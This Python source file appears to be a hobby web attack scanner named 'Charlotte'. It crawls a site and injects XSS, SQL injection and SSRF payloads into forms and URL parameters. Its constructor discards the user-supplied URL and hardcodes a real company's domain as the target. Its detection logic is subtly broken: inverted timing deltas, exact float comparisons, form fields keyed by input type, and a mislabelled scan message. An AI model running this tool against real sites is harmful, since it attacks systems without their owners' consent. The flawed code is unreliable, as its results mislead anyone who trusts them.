from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import List, Text

import requests, re, urllib.parse as urlparse
from bs4 import BeautifulSoup
import time
import aiohttp

import xss_payloads
from sqli import sqli_payloads

from menu import interactive_menu, MenuChoice
from ssrf_payloads import payloads as ssrf_payloads


class Charlotte:
    def __init__(self, url):
        self.url = "https://www.ovo.id/"
        self.session = requests.session()

    # Discover hidden / misconfigured directories WITHIN the web page via a dictionary
    def discover(self, path_to_dict: Text = None):
        print("INITIATING DISCOVERY FOR URL: " + self.url)
        if path_to_dict:
            with open(path_to_dict, 'r') as dictionary:
                for line in dictionary:
                    response = self.session.head(self.url + line)
                    if response.status_code == 200:
                        print(f"FOUND DIRECTORY: {self.url} + {line}")
        else:
            print("NO PATHS TO DISCOVER WERE GIVEN.")

    # Extract forms for input later
    def extract_forms(self, url):
        response = self.session.get(url)
        parsed_html = BeautifulSoup(response.content, features='lxml')
        return parsed_html.findAll('form')

    # In order to build better payloads - it is necessary to get the closing tags of the forms, in order to inject the
    # payload as part of the Javascript itself.
    def extract_closing_tags_for_form(self, form) -> List[Text]:
        closing_tags = []
        for sibling in form.find_all(recursive=False):
            if sibling == form:
                break
            closing_tags.append(f"</{sibling.name}>")

        return closing_tags

    # Input payloads to the webpage
    def submit_forms(self, form, value, url):
        try:
            action = form.get("action")
            post_url = urlparse.urljoin(url, action)
            method = form.get("method")

            inputs_list = form.findAll("input")
            post_data = {}
            for input in inputs_list:
                input_type = input.get("type")
                input_value = input.get("value")
                if input_type == 'text':
                    input_value = value
                post_data[input_type] = input_value
            if method == "post":
                response = self.session.post(post_url, data=post_data, timeout=5)
            else:
                response = self.session.get(post_url, params=post_data, timeout=5)
            response.raise_for_status()  # Raise an HTTPError for bad responses
            return response
        except requests.exceptions.Timeout:
            print("Request timed out. Moving on.", datetime.now().strftime("%H:%M:%S"))
            return None

        except requests.exceptions.RequestException as e:
            print(f"Error submitting form for URL {url}. Exception: {e}")
            return None

    # Crawl the website in order to test every form in the domain
    def extract_same_site_urls(self, page_url):
        response = self.session.get(page_url)

        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            base_domain = self.url
            pattern = re.compile(r'^https?://' + re.escape(base_domain) + r'/\S*$')
            all_links = soup.find_all('a', href=True)
            same_site_urls = [urlparse.urljoin(page_url, link['href']) for link in all_links if
                              pattern.match(urlparse.urljoin(page_url, link['href']))]
            same_site_urls.append(self.url)
            return same_site_urls

        else:
            print(f"Failed to retrieve page: {page_url}")
            return []

    # Search for the reflection of Javascript / HTML code
    def xss_in_form(self, urls: List[Text] = None, path_to_payloads: Text = None):
        """
        :param urls: Will be accepted if the program iterates over many URLs concurrently, thus letting a higher
        order function do the concurrence on its own :param path_to_payloads: :return:
        """
        if not urls:
            urls = self.extract_same_site_urls(self.url)
        for url in urls:
            print(f"INITIATING XSS SCAN FOR {url}")
            forms = self.extract_forms(url)
            if path_to_payloads:
                with open(path_to_payloads, 'r') as payloads_content:
                    for form in forms:
                        for payload in payloads_content:
                            alert_pattern = re.compile(r'alert\(([^)]+)\)')
                            response = self.submit_forms(form, payload, url)
                            if response:
                                matches = alert_pattern.findall(response.text)
                                if matches:
                                    print(f"+++ POSSIBLE XSS SUCCESSFUL FOR PAYLOAD: {payload}")
                                    print("IN FORM: " + str(form))
            else:
                for form in forms:
                    for payload in xss_payloads.payloads:
                        response = self.submit_forms(form, payload, url)
                        if response:
                            alert_pattern = re.compile(r'alert\(([^)]+)\)')
                            matches = alert_pattern.findall(response.text)
                            if matches:
                                print(f"+++ POSSIBLE XSS SUCCESSFUL FOR PAYLOAD: {payload}")
                                print("IN FORM: " + str(form))

    # Dynamically generated, complex XSS payloads based on opening tags prior to input
    def advanced_xss_testing(self, urls: List[Text] = None, path_to_payloads=None):
        if not urls:
            urls = self.extract_same_site_urls(self.url)
        for url in urls:
            print(f"INITIATING ADVANCED XSS SCAN FOR {url}")
            forms = self.extract_forms(url)
            if path_to_payloads:
                with open(path_to_payloads, 'r') as payloads_content:
                    for form in forms:
                        closing_tags = self.extract_closing_tags_for_form(form)
                        closing_tags_string = "".join(closing_tags)
                        for payload in payloads_content:
                            alert_pattern = re.compile(r'alert\(([^)]+)\)')
                            response = self.submit_forms(form, closing_tags_string + payload, url)
                            if response:
                                matches = alert_pattern.findall(response.text)
                                if matches:
                                    print(f"+++ POSSIBLE XSS SUCCESSFUL FOR ADVANCED PAYLOAD:  {closing_tags_string}/{payload}")
                                    print("IN FORM: " + str(form))
            else:
                for form in forms:
                    closing_tags = self.extract_closing_tags_for_form(form)
                    closing_tags_string = "".join(closing_tags)
                    for payload in xss_payloads.payloads:
                        alert_pattern = re.compile(r'alert\(([^)]+)\)')
                        response = self.submit_forms(form, closing_tags_string + payload, url)
                        if response:
                            matches = alert_pattern.findall(response.text)
                            if matches:
                                print(f"+++ POSSIBLE XSS SUCCESSFUL FOR ADVANCED PAYLOAD:  {closing_tags_string}/{payload}")
                                print("IN FORM: " + str(form))

    # Check if different boolean values of SQL injections cause different behaviors, suggesting compromise
    def time_based_sqli(self, urls: List[Text] = None):
        if not urls:
            urls = self.extract_same_site_urls(self.url)
        for url in urls:
            print(f"INITIATING TIME BASED SQLi SCAN FOR {url}")
            forms = self.extract_forms(url)
            for form in forms:
                for payloads in sqli_payloads:
                    # Timing the request with the payload with a true condition
                    start_time_true = time.time()
                    self.submit_forms(form, payloads[0], url)
                    end_time_true = time.time()

                    # Timing the request with the payload with a false condition
                    start_time_false = time.time()
                    self.submit_forms(form, payloads[1], url)
                    end_time_false = time.time()

                    # Timing the request with the payload with a generic payload
                    start_time_generic = time.time()
                    self.submit_forms(form, payloads[2], url)
                    end_time_generic = time.time()

                    time_delta_true = start_time_true - end_time_true
                    time_delta_false = start_time_false - end_time_false
                    time_delta_generic = start_time_generic - end_time_generic

                    # Compare lengths
                    if not time_delta_generic == time_delta_false == time_delta_true:
                        print(f"+++ TIME BASED SQL INJECTION DISCOVERED IN URL: {url}")
                        print("IN FORM: " + str(form))

    # Check for reflection of Javascript / HTML code in the url as well
    def xss_in_link(self, url, path_to_payloads=None):
        print(f"INITIATING SSRF SCAN FOR {url}")
        if path_to_payloads:
            with open(path_to_payloads, 'r') as payloads:
                for payload in payloads:
                    modified_url = url.replace("=", "=" + payload)
                    response = self.session.get(modified_url)
                    if response:
                        if response.status_code == 200 and payload in response.text:
                            print("+++ POSSIBLE FOUND XSS IN URL: ", modified_url)

    # Inject standard SQL payloads, check the size of the response to compare variations
    def sqli(self, urls: List[Text] = None):
        if not urls:
            urls = self.extract_same_site_urls(self.url)
        for url in urls:
            print(f"INITIATING SQLi SCAN FOR {url}")
            forms = self.extract_forms(url)
            if not forms:
                forms = self.extract_forms(url)
            for form in forms:
                for payloads in sqli_payloads:
                    response_true = self.submit_forms(form, payloads[0], url)
                    response_false = self.submit_forms(form, payloads[1], url)
                    response_test = self.submit_forms(form, "test", url)

                    if response_test and response_false and response_true:
                    # Calculate response lengths
                        length_true = len(response_true.text)
                        length_false = len(response_false.text)
                        length_test = len(response_test.text)

                        # Compare lengths
                        if not length_false == length_true == length_test:
                            print("+++ POSSIBLE SQL INJECTION DISCOVERED IN URL: " + str(url))
                            print("IN FORM: " + str(form))

# Good ol' SSRF testing via injection to local resources
    def ssrf(self, urls: List[Text] = None, path_to_payloads=None):
        if not urls:
            urls = self.extract_same_site_urls(self.url)
        for url in urls:
            print(f"INITIATING SSRF SCAN FOR {url}")
            forms = self.extract_forms(url)
            if path_to_payloads:
                with open(path_to_payloads, 'r') as payloads_content:
                    for form in forms:
                        for payload in payloads_content:
                            response = self.submit_forms(form, payload, url)
                            if response:
                                if response.status_code == 200:
                                    print("POSSIBLE SSRF DISCOVERED IN URL: " + str(url))
                                    print("IN FORM " + str(form))
            else:
                for form in forms:
                    for payload in ssrf_payloads:
                        response = self.submit_forms(form, payload, url)
                        if response:
                            if response.status_code == 200:
                                print("+++ POSSIBLE SSRF DISCOVERED IN URL: " + str(url))
                                print("IN FORM " + str(form))


    def start(self):
        print("Starting web crawling and injection...")
        urls = self.extract_same_site_urls(self.url)
        urls.append(self.url)

        with ThreadPoolExecutor() as executor:
            # Use ThreadPoolExecutor for concurrent execution
            futures = []

            for url in urls:
                futures.append(executor.submit(self.process_url, url))

            # Wait for all tasks to complete
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error processing URL. Exception: {e}")

        print("Web crawling and injection completed.")
        self.exit()

#   Receive URLs concurrently and run them through all the scans.
    def process_url(self, url):
        try:
            print("INITIATING SCAN FOR URL: " + str(url))
            self.xss_in_form(urls=[url])
            self.sqli(urls=[url])
            self.time_based_sqli(urls=[url])
            self.advanced_xss_testing(urls=[url])
            self.xss_in_link(url=url)
            self.ssrf(urls=[url])
            print("FINISHED SCAN FOR URL: " + str(url))
        except Exception as e:
            print(f"Scan failed due to {e}")

    def exit(self):
        print('"Goodbye" - Charlotte, your friendly spider')
        exit()

    # Using ENUM and getattr to dynamically generate Charlotte's functions
    def run_interactive_menu(self):
        try:
            choice = int(interactive_menu())
            if 0 < choice <= len(MenuChoice):
                selected_function = MenuChoice(choice)
                getattr(self, selected_function.name.lower())()  # Call the selected function
                if selected_function == MenuChoice.EXIT:
                    self.exit()  # Call the exit function when "Exit" is selected
            else:
                print("Invalid choice. Please enter a number between 1 and 7.")
        except ValueError:
            print("Invalid input. Please enter a valid integer.")


if __name__ == "__main__":
    # parser = argparse.ArgumentParser(description="Interactive Security Testing with Charlotte")
    # parser.add_argument("url", help="URL to test")
    #
    # args = parser.parse_args()
    url = input("Enter URL here: ")

    Charlotte = Charlotte(url)
    Charlotte.run_interactive_menu()
